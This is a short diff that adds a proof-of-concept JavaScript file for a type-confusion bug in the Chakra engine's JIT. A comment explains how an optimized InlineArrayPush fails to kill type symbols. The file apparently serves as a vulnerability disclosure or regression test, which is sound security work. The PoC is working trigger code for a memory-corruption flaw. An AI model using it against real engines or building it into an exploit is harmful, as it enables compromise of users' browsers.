@@ -1,0 +1,27 @@
+/*
+In Chakra, if you add a numeric property to an object having inlined properties, it will start transition to a new type where the space for some of previously inlined properties become for the pointer to the property slots and the pointer to the object array which stores numeric properties. For this reason, when it optimizes an InlineArrayPush instruction which might start transition, it needs to kill corresponding type symbols to prevent type confusion. But it doesn't, so it can lead to type confusion.
+
+PoC:
+*/
+
+function opt(a, b) {
+    a.b = 2;
+    b.push(0);
+    a.a = 0x1234;
+}
+
+function main() {
+    Object.prototype.push = Array.prototype.push;
+
+    for (let i = 0; i < 1000; i++) {
+        let a = {a: 1, b: 2};
+        opt(a, {});
+    }
+
+    let o = {a: 1, b: 2};
+    opt(o, o);
+
+    print(o.a);
+}
+
+main();
